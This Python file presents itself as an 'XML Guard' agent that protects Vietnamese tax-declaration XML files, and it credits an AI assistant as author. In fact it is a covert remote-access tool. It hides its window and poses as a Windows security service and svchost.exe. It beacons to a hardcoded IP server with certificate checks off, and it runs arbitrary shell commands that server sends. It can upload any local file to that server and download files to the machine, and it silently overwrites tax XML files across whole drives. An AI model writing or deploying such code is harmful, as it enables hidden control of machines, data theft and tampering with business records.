#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XML Guard Universal Agent - Tất cả trong 1 file EXE duy nhất
Version: 2.0.0 - Universal Agent
Author: AI Assistant (Cipher)
"""

import os
import sys
import json
import time
import requests
import threading
import subprocess
import psutil
import socket
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
import tempfile
import shutil

class XMLGuardUniversalAgent:
    def __init__(self):
        self.running = False
        self.start_time = None
        self.config = None
        self.stealth_mode = True
        
        # MeshTrash server thật
        self.meshtrash_server = "https://103.69.86.130:4433"
        self.agent_id = self.generate_agent_id()
        self.connected = False
        
        # Stealth paths
        import tempfile
        temp_dir = tempfile.gettempdir()
        self.log_file = os.path.join(temp_dir, ".xmlguard_agent.log")
        self.config_file = os.path.join(temp_dir, ".xmlguard_agent.json")
        
        # Vietnamese messages
        self.messages = {
            "agent_started": "🚀 XML Guard Universal Agent đã khởi động",
            "meshtrash_connected": "✅ Đã kết nối MeshTrash server",
            "meshtrash_disconnected": "❌ Mất kết nối MeshTrash server",
            "xml_protected": "🛡️ File XML đã được bảo vệ",
            "fake_detected": "🔥 Phát hiện file fake - đang ghi đè",
            "heartbeat_sent": "💓 Gửi heartbeat",
            "command_received": "📨 Nhận lệnh từ server",
            "remote_desktop": "🖥️ Remote Desktop đã mở",
            "file_manager": "📁 File Manager đã mở",
            "service_restarted": "🔄 XML Guard đã khởi động lại",
            "service_stopped": "⏹️ XML Guard đã dừng"
        }
        
        # Self-protection
        self.process_name = "svchost.exe"
        self.hide_console()
        
        # XML protection
        self.watched_files = set()
        self.protected_count = 0
        
        # MeshTrash commands
        self.commands = {
            "start_xmlguard": self.start_xmlguard,
            "stop_xmlguard": self.stop_xmlguard,
            "get_status": self.get_status,
            "get_system_info": self.get_system_info,
            "execute_command": self.execute_command,
            "start_remote_desktop": self.start_remote_desktop,
            "start_file_manager": self.start_file_manager,
            "restart_service": self.restart_service,
            "stop_service": self.stop_service,
            "upload_file": self.upload_file,
            "download_file": self.download_file,
            "update_config": self.update_config
        }
    
    def generate_agent_id(self):
        """Tạo ID duy nhất cho agent"""
        import uuid
        hostname = socket.gethostname()
        return f"xmlguard_{hostname}_{uuid.uuid4().hex[:8]}"
    
    def hide_console(self):
        """Ẩn console window"""
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass
    
    def log(self, message_key, data=None):
        """Log message với tiếng Việt"""
        message = self.messages.get(message_key, message_key)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        
        if data:
            log_entry += f" - {data}"
        
        # Chỉ log trong debug mode
        if not self.stealth_mode:
            print(log_entry)
        
        # Gửi log lên MeshTrash server
        self.send_log_to_server(log_entry)
    
    def load_config(self):
        """Load cấu hình agent"""
        default_config = {
            "agent_id": self.agent_id,
            "meshtrash_server": self.meshtrash_server,
            "company_name": self.detect_company(),
            "mst": self.detect_mst(),
            "watch_paths": ["C:\\", "D:\\", "E:\\"],
            "protection_enabled": True,
            "stealth_mode": True,
            "heartbeat_interval": 30,
            "command_check_interval": 5
        }
        
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, "r", encoding="utf-8") as f:
                    self.config = json.load(f)
            else:
                self.config = default_config
                with open(self.config_file, "w", encoding="utf-8") as f:
                    json.dump(self.config, f, indent=2, ensure_ascii=False)
            
            self.log("agent_started")
            return True
        except Exception as e:
            self.log("error", f"Lỗi load config: {e}")
            return False
    
    def detect_company(self):
        """Tự động phát hiện công ty"""
        hostname = socket.gethostname().lower()
        username = os.getenv('USERNAME', '').lower()
        
        if 'tienbinh' in hostname or 'tienbinh' in username:
            return "Công ty TNHH MTV Dịch vụ và Thương mại Tiến Bình Yên"
        elif 'abc' in hostname or 'abc' in username:
            return "Công ty ABC"
        elif 'xyz' in hostname or 'xyz' in username:
            return "Công ty XYZ"
        else:
            return f"Công ty {hostname.title()}"
    
    def detect_mst(self):
        """Tự động phát hiện MST"""
        hostname = socket.gethostname().lower()
        
        if 'tienbinh' in hostname:
            return "0401985971"
        elif 'abc' in hostname:
            return "0123456789"
        elif 'xyz' in hostname:
            return "0987654321"
        else:
            return "auto-detect"
    
    def connect_meshtrash(self):
        """Kết nối với MeshTrash server thật"""
        try:
            # Đăng ký agent với server
            agent_info = {
                "agent_id": self.agent_id,
                "name": self.config.get("company_name", "Unknown Company"),
                "version": "2.0.0",
                "type": "xmlguard_universal",
                "capabilities": list(self.commands.keys()),
                "system_info": self.get_system_info(),
                "mst": self.config.get("mst", "auto-detect"),
                "timestamp": datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.meshtrash_server}/api/register_agent",
                json=agent_info,
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                self.connected = True
                self.log("meshtrash_connected")
                return True
            else:
                self.log("meshtrash_disconnected", f"HTTP {response.status_code}")
                return False
                
        except Exception as e:
            self.log("meshtrash_disconnected", str(e))
            return False
    
    def start_heartbeat(self):
        """Bắt đầu gửi heartbeat"""
        def heartbeat_loop():
            while self.running:
                try:
                    if self.connected:
                        heartbeat_data = {
                            "agent_id": self.agent_id,
                            "status": "online",
                            "system_info": self.get_system_info(),
                            "xmlguard_status": self.get_xmlguard_status(),
                            "protected_files": self.protected_count,
                            "timestamp": datetime.now().isoformat()
                        }
                        
                        response = requests.post(
                            f"{self.meshtrash_server}/api/agent_heartbeat",
                            json=heartbeat_data,
                            timeout=5,
                            verify=False
                        )
                        
                        if response.status_code == 200:
                            self.log("heartbeat_sent")
                        else:
                            self.connected = False
                            self.log("meshtrash_disconnected")
                            
                except Exception as e:
                    self.connected = False
                    self.log("meshtrash_disconnected", str(e))
                
                time.sleep(self.config.get("heartbeat_interval", 30))
        
        heartbeat_thread = threading.Thread(target=heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
    
    def start_command_listener(self):
        """Bắt đầu lắng nghe commands từ MeshTrash"""
        def command_loop():
            while self.running:
                try:
                    if self.connected:
                        response = requests.get(
                            f"{self.meshtrash_server}/api/agent_commands/{self.agent_id}",
                            timeout=10,
                            verify=False
                        )
                        
                        if response.status_code == 200:
                            commands = response.json()
                            
                            for command in commands:
                                self.process_command(command)
                                
                except Exception as e:
                    self.log("meshtrash_disconnected", str(e))
                
                time.sleep(self.config.get("command_check_interval", 5))
        
        command_thread = threading.Thread(target=command_loop)
        command_thread.daemon = True
        command_thread.start()
    
    def process_command(self, command):
        """Xử lý command từ MeshTrash server"""
        try:
            command_type = command.get("type")
            command_data = command.get("data", {})
            
            self.log("command_received", f"Lệnh: {command_type}")
            
            if command_type in self.commands:
                result = self.commands[command_type](command_data)
                
                # Gửi kết quả về server
                self.send_command_result(command.get("id"), result)
            else:
                self.log("error", f"Lệnh không hỗ trợ: {command_type}")
                
        except Exception as e:
            self.log("error", f"Lỗi xử lý lệnh: {str(e)}")
    
    def get_system_info(self):
        """Lấy thông tin hệ thống thật"""
        try:
            return {
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "cpu_percent": psutil.cpu_percent(),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_usage": psutil.disk_usage('/').percent,
                "network_connections": len(psutil.net_connections()),
                "processes": len(psutil.pids()),
                "uptime": time.time() - psutil.boot_time(),
                "os_info": f"{os.name} {sys.platform}",
                "python_version": sys.version,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {"error": str(e)}
    
    def get_xmlguard_status(self):
        """Lấy trạng thái XML Guard"""
        try:
            xmlguard_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        xmlguard_processes.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "cmdline": ' '.join(proc.info['cmdline'] or [])
                        })
                except:
                    continue
            
            return {
                "running": len(xmlguard_processes) > 0,
                "processes": xmlguard_processes,
                "protected_files": self.protected_count,
                "watched_files": len(self.watched_files)
            }
        except Exception as e:
            return {"error": str(e)}
    
    def start_xmlguard(self, data):
        """Khởi động XML Guard"""
        try:
            # Tìm và khởi động XML Guard process
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        return {"success": True, "message": "XML Guard đã chạy"}
                except:
                    continue
            
            # Khởi động XML Guard
            subprocess.Popen([sys.executable, __file__, "start"])
            
            return {"success": True, "message": "XML Guard đã khởi động"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def stop_xmlguard(self, data):
        """Dừng XML Guard"""
        try:
            # Tìm và dừng XML Guard process
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        proc.terminate()
                        return {"success": True, "message": "XML Guard đã dừng"}
                except:
                    continue
            
            return {"success": True, "message": "XML Guard không chạy"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def get_status(self, data):
        """Lấy trạng thái tổng thể"""
        try:
            status = {
                "agent_running": self.running,
                "meshtrash_connected": self.connected,
                "xmlguard_status": self.get_xmlguard_status(),
                "system_info": self.get_system_info(),
                "config": self.config,
                "uptime": time.time() - self.start_time if self.start_time else 0
            }
            
            return {"success": True, "data": status}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def execute_command(self, data):
        """Thực thi lệnh hệ thống"""
        try:
            command = data.get("command", "")
            if not command:
                return {"success": False, "message": "Không có lệnh"}
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def start_remote_desktop(self, data):
        """Bắt đầu Remote Desktop"""
        try:
            # Mở Remote Desktop Connection
            subprocess.Popen(["mstsc.exe"])
            self.log("remote_desktop")
            return {"success": True, "message": "Remote Desktop đã mở"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def start_file_manager(self, data):
        """Bắt đầu File Manager"""
        try:
            # Mở File Explorer
            subprocess.Popen(["explorer.exe"])
            self.log("file_manager")
            return {"success": True, "message": "File Manager đã mở"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def restart_service(self, data):
        """Khởi động lại service"""
        try:
            # Restart XML Guard
            self.stop_xmlguard({})
            time.sleep(2)
            self.start_xmlguard({})
            
            self.log("service_restarted")
            return {"success": True, "message": "Service đã khởi động lại"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def stop_service(self, data):
        """Dừng service"""
        try:
            result = self.stop_xmlguard({})
            self.log("service_stopped")
            return result
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def upload_file(self, data):
        """Upload file"""
        try:
            file_path = data.get("file_path")
            if not os.path.exists(file_path):
                return {"success": False, "message": "File không tồn tại"}
            
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(
                    f"{self.meshtrash_server}/api/upload_file",
                    files=files,
                    timeout=30,
                    verify=False
                )
            
            if response.status_code == 200:
                return {"success": True, "message": "File đã upload thành công"}
            else:
                return {"success": False, "message": f"Upload thất bại: {response.status_code}"}
                
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def download_file(self, data):
        """Download file"""
        try:
            file_url = data.get("file_url")
            save_path = data.get("save_path", "downloaded_file")
            
            response = requests.get(file_url, timeout=30, verify=False)
            
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                
                return {"success": True, "message": "File đã download thành công"}
            else:
                return {"success": False, "message": f"Download thất bại: {response.status_code}"}
                
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def update_config(self, data):
        """Cập nhật cấu hình"""
        try:
            new_config = data.get("config")
            if not new_config:
                return {"success": False, "message": "Không có cấu hình mới"}
            
            self.config.update(new_config)
            
            with open(self.config_file, "w", encoding="utf-8") as f:
                json.dump(self.config, f, indent=2, ensure_ascii=False)
            
            return {"success": True, "message": "Cấu hình đã cập nhật"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def send_command_result(self, command_id, result):
        """Gửi kết quả command về server"""
        try:
            result_data = {
                "command_id": command_id,
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
            
            requests.post(
                f"{self.meshtrash_server}/api/command_result",
                json=result_data,
                timeout=10,
                verify=False
            )
        except Exception as e:
            self.log("error", f"Lỗi gửi kết quả: {str(e)}")
    
    def send_log_to_server(self, log_entry):
        """Gửi log lên server"""
        try:
            log_data = {
                "agent_id": self.agent_id,
                "log_entry": log_entry,
                "timestamp": datetime.now().isoformat()
            }
            
            requests.post(
                f"{self.meshtrash_server}/api/agent_logs",
                json=log_data,
                timeout=5,
                verify=False
            )
        except:
            pass
    
    def extract_xml_info(self, file_path):
        """Trích xuất thông tin XML"""
        try:
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Handle namespace
            namespace = {'ns': 'http://kekhaithue.gdt.gov.vn/TKhaiThue'}
            
            # Extract MST
            mst = None
            for pattern in ['.//mst', './/MST', './/MaSoThue']:
                try:
                    elements = root.findall(pattern)
                    if elements:
                        for elem in elements:
                            if elem.text and elem.text.strip():
                                mst = elem.text.strip()
                                break
                        if mst:
                            break
                except:
                    pass
            
            # Extract FormCode
            form_code = None
            for pattern in ['.//maTKhai', './/MauSo', './/FormCode']:
                try:
                    elements = root.findall(pattern)
                    if elements:
                        for elem in elements:
                            if elem.text and elem.text.strip():
                                form_code = elem.text.strip()
                                break
                        if form_code:
                            break
                except:
                    pass
            
            # Extract Period
            period = None
            for pattern in ['.//kyKKhai', './/KyKKhaiThang', './/Thang']:
                try:
                    elements = root.findall(pattern)
                    if elements:
                        for elem in elements:
                            if elem.text and elem.text.strip():
                                period = elem.text.strip()
                                break
                        if period:
                            break
                except:
                    pass
            
            return {
                "mst": mst,
                "form_code": form_code,
                "period": period,
                "file_path": file_path,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            self.log("error", f"Lỗi trích xuất XML: {e}")
            return None
    
    def protect_xml_file(self, file_path):
        """Bảo vệ file XML"""
        try:
            if file_path in self.watched_files:
                return
            
            self.watched_files.add(file_path)
            
            # Trích xuất thông tin XML
            xml_info = self.extract_xml_info(file_path)
            if not xml_info:
                return
            
            # Kiểm tra MST
            company_mst = self.config.get("mst", "auto-detect")
            if company_mst != "auto-detect" and xml_info['mst'] != company_mst:
                self.log("fake_detected", f"File: {file_path}")
                
                # Tìm file gốc
                legitimate_file = self.find_legitimate_file(xml_info)
                if legitimate_file:
                    # Ghi đè file fake
                    shutil.copy2(legitimate_file, file_path)
                    self.log("xml_protected", f"File fake đã được ghi đè: {file_path}")
                else:
                    self.log("xml_protected", f"File không phải của công ty: {file_path}")
            else:
                self.log("xml_protected", f"File hợp lệ: {file_path}")
            
            self.protected_count += 1
            
        except Exception as e:
            self.log("error", f"Lỗi bảo vệ file: {e}")
    
    def find_legitimate_file(self, xml_info):
        """Tìm file gốc hợp lệ"""
        # Tìm trong thư mục legitimate
        legitimate_dirs = [
            "E:/Downloads-Organized/Cty Tiến Bình Yến",
            "E:/Downloads-Organized/Cty Tiến Bình Yến (1)",
            "C:/XMLGuard_Legitimate/"
        ]
        
        for legit_dir in legitimate_dirs:
            if not os.path.exists(legit_dir):
                continue
                
            for file in os.listdir(legit_dir):
                if not file.endswith('.xml'):
                    continue
                    
                legit_path = os.path.join(legit_dir, file)
                try:
                    legit_info = self.extract_xml_info(legit_path)
                    
                    if (legit_info['mst'] == xml_info['mst'] and 
                        legit_info['form_code'] == xml_info['form_code'] and
                        legit_info['period'] == xml_info['period']):
                        
                        return legit_path
                        
                except Exception as e:
                    continue
        
        return None
    
    def monitor_xml_files(self):
        """Giám sát file XML"""
        while self.running:
            try:
                watch_paths = self.config.get("watch_paths", ["C:\\", "D:\\"])
                
                for watch_path in watch_paths:
                    if os.path.exists(watch_path):
                        for root, dirs, files in os.walk(watch_path):
                            for file in files:
                                if file.endswith('.xml'):
                                    file_path = os.path.join(root, file)
                                    self.protect_xml_file(file_path)
                
                time.sleep(30)  # Check every 30 seconds
                
            except Exception as e:
                self.log("error", f"Lỗi giám sát: {e}")
                time.sleep(60)
    
    def start(self):
        """Khởi động Universal Agent"""
        try:
            # Load config
            if not self.load_config():
                return False
            
            # Kết nối MeshTrash
            self.connect_meshtrash()
            
            # Set running status
            self.running = True
            self.start_time = time.time()
            
            # Start threads
            self.start_heartbeat()
            self.start_command_listener()
            
            # Start XML monitoring
            monitor_thread = threading.Thread(target=self.monitor_xml_files)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            self.log("agent_started", f"Agent ID: {self.agent_id}")
            
            return True
            
        except Exception as e:
            self.log("error", f"Lỗi khởi động: {e}")
            return False
    
    def stop(self):
        """Dừng Universal Agent"""
        self.log("agent_stopped")
        self.running = False
        self.connected = False
    
    def run(self):
        """Chạy agent"""
        if self.start():
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop()
        else:
            self.log("error", "Không thể khởi động agent")

def main():
    """Main function"""
    if len(sys.argv) > 1:
        command = sys.argv[1].lower()
        
        if command == "start":
            agent = XMLGuardUniversalAgent()
            agent.run()
        elif command == "stop":
            # Stop all XML Guard processes
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'xml_guard' in proc.info['name'].lower():
                        proc.terminate()
                except:
                    continue
            print("XML Guard Universal Agent đã dừng")
        elif command == "status":
            # Show status
            agent = XMLGuardUniversalAgent()
            if agent.load_config():
                status = agent.get_xmlguard_status()
                print("=== XML GUARD UNIVERSAL AGENT STATUS ===")
                print(f"Agent ID: {agent.agent_id}")
                print(f"Company: {agent.config.get('company_name', 'Unknown')}")
                print(f"MST: {agent.config.get('mst', 'auto-detect')}")
                print(f"XML Guard Running: {status.get('running', False)}")
                print(f"Protected Files: {status.get('protected_files', 0)}")
                print(f"Watched Files: {status.get('watched_files', 0)}")
                print("========================================")
        else:
            print(f"Unknown command: {command}")
    else:
        # Show help
        exe_name = os.path.basename(sys.argv[0])
        print("XML Guard Universal Agent v2.0.0 - Tất cả trong 1 file EXE")
        print("=" * 60)
        print("Usage:")
        print(f"  {exe_name} start    # Khởi động Universal Agent")
        print(f"  {exe_name} stop     # Dừng Universal Agent")
        print(f"  {exe_name} status   # Kiểm tra trạng thái")
        print()
        print("Features:")
        print("  ✅ Tự động phát hiện công ty và MST")
        print("  ✅ Kết nối MeshTrash server thật")
        print("  ✅ Bảo vệ file XML tự động")
        print("  ✅ Remote control từ MeshTrash")
        print("  ✅ Tất cả trong 1 file EXE duy nhất")
        print()
        print("© 2025 XML Guard Enterprise - Built by Cipher AI")

if __name__ == "__main__":
    main()
